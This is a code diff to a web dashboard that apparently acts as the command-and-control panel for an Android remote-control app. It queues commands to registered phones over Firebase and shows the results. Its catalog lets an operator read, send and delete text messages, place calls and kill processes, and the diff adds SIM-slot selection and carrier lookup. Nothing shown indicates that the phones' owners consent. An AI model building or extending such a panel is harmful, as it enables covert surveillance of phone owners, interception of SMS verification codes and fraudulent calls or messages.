@@ -146,6 +146,13 @@
         .device-card .dc-meta {
             display: flex; gap: 12px; font-size: 12px; color: #6b7280; flex-wrap: wrap;
         }
+        .device-card .dc-meta .sim-info {
+            background: #1e2230;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: 10px;
+            color: #a78bfa;
+        }
         .device-card .dc-enter {
             margin-top: 12px; font-size: 10px; text-transform: uppercase;
             letter-spacing: 0.5px; color: #6c5ce7; font-weight: 600;
@@ -245,18 +252,30 @@
         .modal-overlay.open { display: flex; }
         .modal-box {
             background: #13182a; border: 1px solid #1e2230;
-            border-radius: 16px; padding: 28px; width: 90%; max-width: 420px;
+            border-radius: 16px; padding: 28px; width: 90%; max-width: 460px;
             box-shadow: 0 20px 60px rgba(0,0,0,0.6);
         }
         .modal-box h3 { font-size: 17px; margin-bottom: 4px; }
         .modal-box p { font-size: 13px; color: #6b7280; margin-bottom: 16px; }
         .modal-box label { font-size: 12px; display: block; margin-top: 10px; color: #9ba1b2; }
-        .modal-box input, .modal-box textarea {
+        .modal-box input, .modal-box textarea, .modal-box select {
             width: 100%; padding: 9px 12px; border-radius: 8px;
             background: #0b0d12; border: 1px solid #1e2230;
             color: #e4e7ed; font-size: 13px; font-family: inherit; margin-top: 4px;
         }
-        .modal-box input:focus { outline: 2px solid #6c5ce766; border-color: transparent; }
+        .modal-box input:focus, .modal-box select:focus { outline: 2px solid #6c5ce766; border-color: transparent; }
+        .modal-box select {
+            appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%239ba1b2' d='M6 8L1 3h10z'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 10px center;
+            padding-right: 30px;
+            cursor: pointer;
+        }
+        .modal-box select option {
+            background: #13182a;
+            color: #e4e7ed;
+        }
         .modal-buttons { display: flex; gap: 10px; margin-top: 18px; justify-content: flex-end; }
         .modal-buttons .btn { font-size: 12px; padding: 7px 16px; }
 
@@ -330,6 +349,7 @@
                     <div id="sidebarAuth" style="margin-top:4px;font-size:10px;word-break:break-all;"></div>
                     <div id="sidebarDeviceCount" style="margin-top:4px;">Devices: —</div>
                     <div id="sidebarPingStatus" style="margin-top:4px;font-size:10px;color:#5a6070;"></div>
+                    <div id="sidebarSimInfo" style="margin-top:4px;font-size:10px;color:#a78bfa;"></div>
                 </div>
             </nav>
             <div class="sidebar-footer">
@@ -390,9 +410,11 @@
                     <div class="topbar-left">
                         <h2>⌘ Command Center</h2>
                         <p>Device: <span id="cmdDeviceDisplay" style="font-family:monospace;">—</span></p>
+                        <p id="cmdSimDisplay" style="font-size:11px;color:#a78bfa;margin-top:2px;"></p>
                     </div>
                     <div class="topbar-right">
                         <button class="btn btn-ghost btn-sm" onclick="showView('dashboard')">← Back</button>
+                        <button class="btn btn-ghost btn-sm" onclick="refreshSimInfo()" id="refreshSimBtn" style="display:none;">⟳ SIMs</button>
                         <button class="btn btn-ghost btn-sm" onclick="clearCmdResults()">Clear</button>
                     </div>
                 </div>
@@ -451,6 +473,15 @@
             <h3 id="modalTitle">Action</h3>
             <p id="modalSub"></p>
             <div id="modalFields"></div>
+            <div id="modalSimSelector" style="display:none;margin-top:12px;">
+                <label>📱 SIM Slot</label>
+                <select id="simSlotSelect">
+                    <option value="">-- Auto / Default SIM --</option>
+                    <option value="1">SIM 1</option>
+                    <option value="2">SIM 2</option>
+                </select>
+                <div id="simSlotInfo" style="font-size:10px;color:#5a6070;margin-top:3px;"></div>
+            </div>
             <div class="modal-buttons">
                 <button class="btn btn-ghost" onclick="closeParamModal()">Cancel</button>
                 <button class="btn btn-primary" onclick="executeFromModal()">Execute</button>
@@ -500,7 +531,7 @@
 
 <script>
     // ═══════════════════════════════════════════════════════
-    //  COMMAND CATALOG  —  FULLY SYNCED WITH CommandExecutor.kt
+    //  COMMAND CATALOG  —  FULLY SYNCED WITH SIM SUPPORT
     // ═══════════════════════════════════════════════════════
     const CAT_NAMES = {
         device: 'Device Control',
@@ -551,8 +582,8 @@
             { icon: '🗑️', name: 'Kill Process', action: 'kill', params: { pid: '1234' } },
             { icon: '📡', name: 'Ping', action: 'ping' },
             { icon: '🌐', name: 'Open URL', action: 'open_url', params: { url: 'https://example.com' } },
-            { icon: '📞', name: 'Start Call', action: 'start_call', params: { number: '+1234567890' } },
-            { icon: '💬', name: 'Send SMS', action: 'send_sms', params: { to: '+1234567890', text: 'Hello' } },
+            { icon: '📞', name: 'Start Call', action: 'start_call', params: { number: '+1234567890' }, simSlot: true },
+            { icon: '💬', name: 'Send SMS', action: 'send_sms', params: { to: '+1234567890', text: 'Hello' }, simSlot: true },
             { icon: '📋', name: 'List SMS', action: 'list_sms', params: { folder: 'inbox' } },
             { icon: '🗑️', name: 'Delete SMS', action: 'delete_sms', params: { id: '123' } },
             { icon: '💬', name: 'SMS Threads', action: 'get_sms_threads' },
@@ -596,6 +627,10 @@
         contextDeviceId: null,
         pendingModalCmd: null,
         deviceUnsubscribe: null,
+        // SIM cache: map of deviceId -> {sims: [{slot, carrierName}], timestamp}
+        simCache: {},
+        // Pending SIM result listeners
+        simResultListeners: {},
     };
 
     let firebaseInitialized = false;
@@ -606,7 +641,7 @@
     let pingCount = 0;
 
     // ═══════════════════════════════════════════════════════
-    //  FIREBASE CONFIG — PROPER WEB APP CREDENTIALS
+    //  FIREBASE CONFIG
     // ═══════════════════════════════════════════════════════
     function getConfig() {
         const stored = localStorage.getItem('mc_firebase_config');
@@ -674,7 +709,6 @@
                     setFirebaseStatus('ok', 'online');
                     updateStats();
                     startDeviceListener();
-                    // Start pinging shortly after auth
                     setTimeout(pingOfflineDevices, 2000);
                 })
                 .catch(err => {
@@ -683,7 +717,6 @@
                     document.getElementById('sidebarStatus').innerHTML = '❌ ' + err.code;
                     document.getElementById('sidebarAuth').textContent = err.message;
                     setFirebaseStatus('error', err.message);
-
                     let tip = '';
                     if (err.code === 'auth/operation-not-allowed') {
                         tip = 'Go to Firebase Console → Authentication → Sign-in methods → Enable <b>Anonymous</b>';
@@ -692,7 +725,6 @@
                     } else {
                         tip = 'Check Firebase Console and your config. Click ⚙️ Config to edit.';
                     }
-
                     document.getElementById('deviceListContainer').innerHTML = `
                         <div class="empty-state">
                             <div class="big-icon">🚫</div>
@@ -723,21 +755,13 @@
 
     function setFirebaseStatus(type, msg) {
         const el = document.getElementById('dashFirebaseStatus');
-        if (type === 'ok') {
-            el.innerHTML = '✅ ' + msg;
-            el.style.color = '#34d399';
-        } else if (type === 'error') {
-            el.innerHTML = '❌ ' + msg;
-            el.style.color = '#f87171';
-        } else {
-            el.innerHTML = '<span class="loading-spinner" style="width:12px;height:12px;border-width:2px;vertical-align:middle;margin-right:6px;"></span> ' + msg;
-            el.style.color = '#fbbf24';
-        }
+        if (type === 'ok') { el.innerHTML = '✅ ' + msg; el.style.color = '#34d399'; }
+        else if (type === 'error') { el.innerHTML = '❌ ' + msg; el.style.color = '#f87171'; }
+        else { el.innerHTML = '<span class="loading-spinner" style="width:12px;height:12px;border-width:2px;vertical-align:middle;margin-right:6px;"></span> ' + msg; el.style.color = '#fbbf24'; }
     }
 
     // ═══════════════════════════════════════════════════════
-    //  AUTO-PING — sends a ping command to borderline-offline devices
-    //  so they wake up and update lastSeen → dashboard shows online
+    //  AUTO-PING
     // ═══════════════════════════════════════════════════════
     function pingOfflineDevices() {
         if (!firebaseInitialized || !db || state.devices.length === 0) return;
@@ -746,26 +770,125 @@
         state.devices.forEach(d => {
             const lastSeen = d.lastSeen || 0;
             const age = now - lastSeen;
-            // Ping devices that disappeared 30s–10min ago (likely alive)
             if (age > 30000 && age < 600000) {
                 const cmdId = now + '_' + Math.random().toString(36).slice(2, 8) + '_ping';
                 db.collection('commands').doc(cmdId).set({
-                    deviceId: d.id,
-                    action: 'ping',
-                    params: {},
-                    createdAt: Date.now()
+                    deviceId: d.id, action: 'ping', params: {}, createdAt: Date.now()
                 }).catch(() => {});
                 pinged++;
             }
         });
         pingCount += pinged;
-        if (pinged > 0) {
-            appendDiag(`⚡ Pinged ${pinged} device(s) to wake up`);
-        }
+        if (pinged > 0) appendDiag(`⚡ Pinged ${pinged} device(s) to wake up`);
         const pingEl = document.getElementById('dashPingStatus');
         if (pingEl) pingEl.textContent = pinged > 0 ? `Pinging ${pinged}…` : 'Watching';
         const sidebarPing = document.getElementById('sidebarPingStatus');
         if (sidebarPing) sidebarPing.textContent = `Pings sent: ${pingCount}`;
+    }
+
+    // ═══════════════════════════════════════════════════════
+    //  SIM INFO MANAGEMENT
+    // ═══════════════════════════════════════════════════════
+    function fetchSimInfo(deviceId) {
+        if (!firebaseInitialized || !db || !deviceId) return;
+        appendDiag(`📱 Requesting SIM info for ${deviceId.slice(0, 8)}…`);
+        const cmdId = Date.now() + '_' + Math.random().toString(36).slice(2, 8) + '_sims';
+
+        // Listen for the result
+        const unsub = db.collection('results').doc(cmdId).onSnapshot(snap => {
+            if (snap.exists) {
+                const data = snap.data();
+                if (data.status === 'ok') {
+                    const output = data.output || '';
+                    parseAndCacheSimInfo(deviceId, output);
+                }
+                unsub();
+            }
+        });
+
+        // Timeout cleanup
+        setTimeout(() => { unsub(); }, 30000);
+
+        // Send the command
+        db.collection('commands').doc(cmdId).set({
+            deviceId: deviceId,
+            action: 'list_sims',
+            params: {},
+            createdAt: Date.now()
+        }).catch(() => {});
+    }
+
+    function parseAndCacheSimInfo(deviceId, output) {
+        const sims = [];
+        // Output format: "slot 1: Vodafone | slot 2: Orange"
+        const parts = output.split('|');
+        parts.forEach(p => {
+            const match = p.trim().match(/slot (\d+):\s*(.+)/i);
+            if (match) {
+                sims.push({ slot: parseInt(match[1]), carrierName: match[2].trim() });
+            }
+        });
+
+        state.simCache[deviceId] = {
+            sims: sims,
+            timestamp: Date.now()
+        };
+
+        appendDiag(`📱 SIM info for ${deviceId.slice(0, 8)}: ${sims.map(s => `Slot ${s.slot}: ${s.carrierName}`).join(', ') || 'no SIMs'}`);
+
+        // Update sidebar SIM display
+        updateSidebarSimInfo(deviceId, sims);
+
+        // If we're in Command Center for this device, update the SIM dropdown
+        if (state.selectedDeviceId === deviceId) {
+            updateSimDropdown(sims);
+            // Show refresh button
+            document.getElementById('refreshSimBtn').style.display = 'inline-flex';
+        }
+    }
+
+    function updateSidebarSimInfo(deviceId, sims) {
+        const el = document.getElementById('sidebarSimInfo');
+        if (sims && sims.length > 0) {
+            el.textContent = '📱 ' + sims.map(s => `S${s.slot}: ${s.carrierName}`).join(' | ');
+        } else if (deviceId && state.simCache[deviceId]) {
+            const cached = state.simCache[deviceId].sims;
+            if (cached.length > 0) {
+                el.textContent = '📱 ' + cached.map(s => `S${s.slot}: ${s.carrierName}`).join(' | ');
+            } else {
+                el.textContent = '📱 No SIM info';
+            }
+        }
+    }
+
+    function updateSimDropdown(sims) {
+        const select = document.getElementById('simSlotSelect');
+        // Keep the "Auto" option
+        select.innerHTML = '<option value="">📱 Auto / Default SIM</option>';
+        if (sims && sims.length > 0) {
+            sims.forEach(s => {
+                const opt = document.createElement('option');
+                opt.value = s.slot.toString();
+                opt.textContent = `SIM ${s.slot} — ${s.carrierName}`;
+                select.appendChild(opt);
+            });
+        } else {
+            // Fallback: generic SIM 1 / SIM 2
+            select.innerHTML += '<option value="1">SIM 1</option><option value="2">SIM 2</option>';
+        }
+        const info = document.getElementById('simSlotInfo');
+        if (sims && sims.length > 0) {
+            info.textContent = `${sims.length} active SIM(s) detected`;
+        } else if (state.devices.find(d => d.id === state.selectedDeviceId)) {
+            info.textContent = 'Unknown — sending list_sims may reveal carriers';
+        }
+    }
+
+    function refreshSimInfo() {
+        if (state.selectedDeviceId) {
+            fetchSimInfo(state.selectedDeviceId);
+            toast('Requesting SIM info…', 'info');
+        }
     }
 
     // ═══════════════════════════════════════════════════════
@@ -782,20 +905,16 @@
             .onSnapshot(snapshot => {
                 state.loadingDevices = false;
                 state.devices = [];
-                snapshot.forEach(doc => {
-                    state.devices.push({ id: doc.id, ...doc.data() });
-                });
+                snapshot.forEach(doc => { state.devices.push({ id: doc.id, ...doc.data() }); });
                 appendDiag('📡 Snapshot: ' + state.devices.length + ' devices');
                 state.devices.sort((a, b) => {
-                    const aOn = isOnline(a);
-                    const bOn = isOnline(b);
+                    const aOn = isOnline(a); const bOn = isOnline(b);
                     if (aOn !== bOn) return aOn ? -1 : 1;
                     return (a.id).localeCompare(b.id);
                 });
                 renderDeviceList();
                 updateStats();
                 document.getElementById('sidebarDeviceCount').textContent = 'Devices: ' + state.devices.length;
-                // After first load, ping devices that look offline
                 pingOfflineDevices();
             }, err => {
                 state.loadingDevices = false;
@@ -810,13 +929,10 @@
             appendDiag('Falling back to .get() …');
             const snap = await db.collection('devices').get();
             state.devices = [];
-            snap.forEach(doc => {
-                state.devices.push({ id: doc.id, ...doc.data() });
-            });
+            snap.forEach(doc => { state.devices.push({ id: doc.id, ...doc.data() }); });
             appendDiag('✅ .get() returned ' + state.devices.length + ' devices');
             state.devices.sort((a, b) => {
-                const aOn = isOnline(a);
-                const bOn = isOnline(b);
+                const aOn = isOnline(a); const bOn = isOnline(b);
                 if (aOn !== bOn) return aOn ? -1 : 1;
                 return (a.id).localeCompare(b.id);
             });
@@ -830,23 +946,17 @@
     }
 
     async function refreshDevices() {
-        if (!firebaseInitialized || !db) {
-            toast('Not connected. ⚙️ Config to retry.', 'error');
-            return;
-        }
+        if (!firebaseInitialized || !db) { toast('Not connected. ⚙️ Config to retry.', 'error'); return; }
         state.loadingDevices = true;
         renderDeviceList();
         toast('Refreshing…', 'info');
         try {
             const snap = await db.collection('devices').get();
             state.devices = [];
-            snap.forEach(doc => {
-                state.devices.push({ id: doc.id, ...doc.data() });
-            });
+            snap.forEach(doc => { state.devices.push({ id: doc.id, ...doc.data() }); });
             state.loadingDevices = false;
             state.devices.sort((a, b) => {
-                const aOn = isOnline(a);
-                const bOn = isOnline(b);
+                const aOn = isOnline(a); const bOn = isOnline(b);
                 if (aOn !== bOn) return aOn ? -1 : 1;
                 return (a.id).localeCompare(b.id);
             });
@@ -855,52 +965,27 @@
             document.getElementById('sidebarDeviceCount').textContent = 'Devices: ' + state.devices.length;
             toast('Found ' + state.devices.length + ' devices', 'success');
             pingOfflineDevices();
-        } catch (e) {
-            state.loadingDevices = false;
-            toast('Refresh: ' + e.message, 'error');
-        }
+        } catch (e) { state.loadingDevices = false; toast('Refresh: ' + e.message, 'error'); }
     }
 
-    function isOnline(d) {
-        return (Date.now() - (d.lastSeen || 0)) < 120000;
-    }
+    function isOnline(d) { return (Date.now() - (d.lastSeen || 0)) < 120000; }
 
     function renderDeviceList() {
         const container = document.getElementById('deviceListContainer');
-
         if (state.loadingDevices && state.devices.length === 0) {
-            container.innerHTML = `
-                <div class="empty-state">
-                    <div class="big-icon"><span class="loading-spinner" style="width:40px;height:40px;border-width:3px;"></span></div>
-                    <h3>Loading devices…</h3>
-                    <p>Querying Firestore devices collection</p>
-                </div>
-            `;
+            container.innerHTML = `<div class="empty-state"><div class="big-icon"><span class="loading-spinner" style="width:40px;height:40px;border-width:3px;"></span></div><h3>Loading devices…</h3><p>Querying Firestore devices collection</p></div>`;
             return;
         }
-
         if (state.devices.length === 0) {
-            container.innerHTML = `
-                <div class="empty-state">
-                    <div class="big-icon">📡</div>
-                    <h3>No devices registered</h3>
-                    <p>No documents found in the <code>devices</code> collection</p>
-                    <p class="sub">Devices appear once the Android app calls FirestoreRepo.registerDevice()</p>
-                    <button class="btn btn-primary btn-sm" style="margin-top:14px;" onclick="refreshDevices()">⟳ Check Again</button>
-                </div>
-            `;
+            container.innerHTML = `<div class="empty-state"><div class="big-icon">📡</div><h3>No devices registered</h3><p>No documents found in the <code>devices</code> collection</p><p class="sub">Devices appear once the Android app calls FirestoreRepo.registerDevice()</p><button class="btn btn-primary btn-sm" style="margin-top:14px;" onclick="refreshDevices()">⟳ Check Again</button></div>`;
             return;
         }
-
         container.innerHTML = '<div class="device-grid">' +
             state.devices.map(d => {
                 const online = isOnline(d);
                 const short = d.id.slice(0, 8) + '…' + d.id.slice(-6);
-                const lastSeen = d.lastSeen
-                    ? new Date(d.lastSeen).toLocaleString()
-                    : 'never';
-                const hasToken = d.fcmToken ? '🔔 Push' : '📴 No FCM';
                 const lastSeenAgo = d.lastSeen ? Math.floor((Date.now() - d.lastSeen) / 1000) + 's ago' : '—';
+                const hasToken = d.fcmToken ? '🔔 Push' : '📴 No FCM';
                 return `
                     <div class="device-card ${online ? 'online' : ''}"
                          onclick="onDeviceTap('${d.id}')"
@@ -909,9 +994,7 @@
                          ontouchend="onTouchEnd(event)">
                         <div class="dc-top">
                             <span class="dc-id">${short}</span>
-                            <span class="dc-status ${online ? 'online' : 'offline'}">
-                                ${online ? '● Online' : '○ Offline'}
-                            </span>
+                            <span class="dc-status ${online ? 'online' : 'offline'}">${online ? '● Online' : '○ Offline'}</span>
                         </div>
                         <div class="dc-name">${d.deviceName || 'Android Device'}</div>
                         <div class="dc-meta">
@@ -939,7 +1022,6 @@
     // ═══════════════════════════════════════════════════════
     let touchTimer = null;
     let touchDeviceId = null;
-
     function onTouchStart(event, deviceId) {
         touchDeviceId = deviceId;
         touchTimer = setTimeout(() => {
@@ -948,11 +1030,7 @@
             showContextMenu({ clientX: touch.clientX, clientY: touch.clientY }, deviceId);
         }, 600);
     }
-
-    function onTouchEnd(event) {
-        if (touchTimer) { clearTimeout(touchTimer); touchTimer = null; }
-    }
-
+    function onTouchEnd(event) { if (touchTimer) { clearTimeout(touchTimer); touchTimer = null; } }
     function onDeviceTap(deviceId) {
         if (document.getElementById('contextMenu').classList.contains('open')) return;
         selectDevice(deviceId);
@@ -971,45 +1049,33 @@
         if (rect.bottom > window.innerHeight) menu.style.top = (window.innerHeight - rect.height - 10) + 'px';
         menu.classList.add('open');
     }
-
-    function closeContextMenu() {
-        document.getElementById('contextMenu').classList.remove('open');
-        state.contextDeviceId = null;
-    }
-
+    function closeContextMenu() { document.getElementById('contextMenu').classList.remove('open'); state.contextDeviceId = null; }
     function contextAction(action) {
         const deviceId = state.contextDeviceId;
         if (!deviceId) { closeContextMenu(); return; }
-        if (action === 'enter') {
-            closeContextMenu();
-            selectDevice(deviceId);
-        } else if (action === 'delete') {
+        if (action === 'enter') { closeContextMenu(); selectDevice(deviceId); }
+        else if (action === 'delete') {
             closeContextMenu();
             document.getElementById('deleteModalInfo').textContent = 'Remove device ' + deviceId.slice(0, 8) + '…' + deviceId.slice(-6) + '?';
             document.getElementById('deleteModal').dataset.deviceId = deviceId;
             document.getElementById('deleteModal').classList.add('open');
         }
     }
-
     function closeDeleteModal() { document.getElementById('deleteModal').classList.remove('open'); }
-
     async function confirmDelete() {
         const deviceId = document.getElementById('deleteModal').dataset.deviceId;
         if (!deviceId) { closeDeleteModal(); return; }
-        try {
-            await db.collection('devices').doc(deviceId).delete();
-            toast('Deleted: ' + deviceId.slice(0, 8) + '…', 'success');
-        } catch (e) { toast('Delete failed: ' + e.message, 'error'); }
+        try { await db.collection('devices').doc(deviceId).delete(); toast('Deleted: ' + deviceId.slice(0, 8) + '…', 'success'); }
+        catch (e) { toast('Delete failed: ' + e.message, 'error'); }
         closeDeleteModal();
     }
-
     document.addEventListener('click', e => {
         const menu = document.getElementById('contextMenu');
         if (menu.classList.contains('open') && !menu.contains(e.target)) closeContextMenu();
     });
 
     // ═══════════════════════════════════════════════════════
-    //  VIEW SWITCHING  —  with auto-ping on dashboard entry
+    //  VIEW SWITCHING
     // ═══════════════════════════════════════════════════════
     function showView(name) {
         document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
@@ -1019,17 +1085,12 @@
         document.querySelectorAll('.sidebar-nav a')[idx]?.classList.add('active');
 
         if (name === 'dashboard') {
-            // Start ping timer: every 15s on dashboard
             pingOfflineDevices();
             if (pingTimer) clearInterval(pingTimer);
             pingTimer = setInterval(pingOfflineDevices, 15000);
             appendDiag('📋 Dashboard active — ping watch started');
         } else {
-            if (pingTimer) {
-                clearInterval(pingTimer);
-                pingTimer = null;
-                appendDiag('⏹️ Ping watch stopped');
-            }
+            if (pingTimer) { clearInterval(pingTimer); pingTimer = null; appendDiag('⏹️ Ping watch stopped'); }
         }
     }
 
@@ -1042,6 +1103,21 @@
         document.getElementById('cmdLastStatus').className = 'value green';
         document.getElementById('cmdDeviceDisplay').textContent = deviceId.slice(0, 8) + '…' + deviceId.slice(-6);
         document.getElementById('cmdDeviceDisplay').title = deviceId;
+
+        // Try to show cached SIM info
+        const cached = state.simCache[deviceId];
+        const simDisplay = document.getElementById('cmdSimDisplay');
+        const refreshBtn = document.getElementById('refreshSimBtn');
+        if (cached && cached.sims.length > 0) {
+            simDisplay.textContent = '📱 ' + cached.sims.map(s => `SIM ${s.slot}: ${s.carrierName}`).join(' | ');
+            refreshBtn.style.display = 'inline-flex';
+        } else {
+            simDisplay.textContent = '📱 No SIM info — tap ⟳ SIMs to scan';
+            refreshBtn.style.display = 'inline-flex';
+            // Auto-fetch SIM info
+            fetchSimInfo(deviceId);
+        }
+
         renderCmdCategories('device');
         renderCmdResults();
         showView('command');
@@ -1065,7 +1141,8 @@
         let cards = '<div class="cmd-grid">';
         cmds.forEach(cmd => {
             const hp = cmd.params && Object.keys(cmd.params).length > 0;
-            cards += '<div class="cmd-card"><div class="cmd-dot ' + (hp ? 'has-params' : '') + '"></div><div class="cmd-icon">' + cmd.icon + '</div><div class="cmd-name">' + cmd.name + '</div></div>';
+            const hasSim = cmd.simSlot === true;
+            cards += '<div class="cmd-card"><div class="cmd-dot ' + ((hp || hasSim) ? 'has-params' : '') + '"></div><div class="cmd-icon">' + cmd.icon + '</div><div class="cmd-name">' + cmd.name + '</div></div>';
         });
         cards += '</div>';
         grid.innerHTML = tabs + cards;
@@ -1074,7 +1151,7 @@
             if (!cmd) return;
             el.addEventListener('click', () => {
                 const hp = cmd.params && Object.keys(cmd.params).length > 0;
-                if (hp) showParamModal(cmd);
+                if (hp || cmd.simSlot) showParamModal(cmd);
                 else executeCmd(cmd, {});
             });
         });
@@ -1098,6 +1175,17 @@
                 fields.appendChild(input);
             });
         }
+        // Show SIM selector for commands that need it
+        const simSelector = document.getElementById('modalSimSelector');
+        if (cmd.simSlot) {
+            simSelector.style.display = 'block';
+            // Populate with cached SIM info if available
+            const cached = state.simCache[state.selectedDeviceId];
+            updateSimDropdown(cached ? cached.sims : []);
+        } else {
+            simSelector.style.display = 'none';
+        }
+
         state.pendingModalCmd = cmd;
         modal.classList.add('open');
     }
@@ -1109,6 +1197,17 @@
         if (!cmd) return;
         const params = {};
         document.querySelectorAll('#modalFields input').forEach(inp => { params[inp.dataset.paramKey] = inp.value; });
+        // Add SIM slot if selector is visible
+        const simSelector = document.getElementById('modalSimSelector');
+        if (simSelector.style.display !== 'none') {
+            const simVal = document.getElementById('simSlotSelect').value;
+            if (simVal) {
+                // The Android side expects "sim" param for send_sms and "sim_slot" for start_call
+                // We'll send both "sim_slot" (generic) and "sim" (for backward compat with send_sms)
+                params.sim_slot = simVal;
+                params.sim = simVal;
+            }
+        }
         closeParamModal();
         executeCmd(cmd, params);
     }
@@ -1121,26 +1220,28 @@
         if (!deviceId || !firebaseInitialized || !db) { toast('No device selected or not connected', 'error'); return; }
         const cmdId = Date.now() + '_' + Math.random().toString(36).slice(2, 8);
         const now = new Date().toLocaleTimeString();
-        state.results.unshift({ id: cmdId, action: cmd.action, name: cmd.name, status: 'pending', output: 'Sent…', time: now });
+        const actionLabel = cmd.name || cmd.action;
+        state.results.unshift({ id: cmdId, action: cmd.action, name: actionLabel, status: 'pending', output: 'Sent…', time: now });
         state.commandsSent++;
         document.getElementById('cmdCountDisplay').textContent = state.commandsSent;
         renderCmdResults();
         try {
             await db.collection('commands').doc(cmdId).set({ deviceId: deviceId, action: cmd.action, params: params, createdAt: Date.now() });
-            toast('→ ' + cmd.name, 'info');
+            toast('→ ' + actionLabel, 'info');
             const unsub = db.collection('results').doc(cmdId).onSnapshot(snap => {
                 if (snap.exists) {
                     const d = snap.data();
                     updateCmdResult(cmdId, d.status || 'error', d.output || '—');
                     unsub();
-                    toast(d.status === 'ok' ? '✓ ' + cmd.name : '✗ ' + cmd.name, d.status === 'ok' ? 'success' : 'error');
+                    // If this was a list_sims result, parse it
+                    if (cmd.action === 'list_sims' && d.status === 'ok') {
+                        parseAndCacheSimInfo(deviceId, d.output || '');
+                    }
+                    toast(d.status === 'ok' ? '✓ ' + actionLabel : '✗ ' + actionLabel, d.status === 'ok' ? 'success' : 'error');
                 }
             });
             setTimeout(() => { updateCmdResult(cmdId, 'error', 'Timeout (30s)'); unsub(); }, 30000);
-        } catch (e) {
-            updateCmdResult(cmdId, 'error', e.message);
-            toast('Failed: ' + e.message, 'error');
-        }
+        } catch (e) { updateCmdResult(cmdId, 'error', e.message); toast('Failed: ' + e.message, 'error'); }
     }
 
     function updateCmdResult(id, status, output) {
@@ -1180,9 +1281,7 @@
         document.getElementById('cfg_appId').value = cfg.appId || '';
         document.getElementById('settingsModal').classList.add('open');
     }
-
     function closeSettings() { document.getElementById('settingsModal').classList.remove('open'); }
-
     function saveSettingsAndReconnect() {
         const config = {
             apiKey: document.getElementById('cfg_apiKey').value.trim(),
@@ -1198,7 +1297,6 @@
         toast('Config saved. Reloading…', 'info');
         setTimeout(() => location.reload(), 500);
     }
-
     document.getElementById('settingsModal').addEventListener('click', function(e) { if (e.target === this) closeSettings(); });
 
     // ═══════════════════════════════════════════════════════
@@ -1212,7 +1310,6 @@
         c.appendChild(el);
         setTimeout(() => { el.style.opacity = '0'; el.style.transform = 'translateX(20px)'; el.style.transition = 'all 0.3s'; setTimeout(() => el.remove(), 300); }, 4000);
     }
-
     function escapeHtml(s) { if (!s) return ''; const d = document.createElement('div'); d.textContent = s; return d.innerHTML; }
 </script>
 </body>
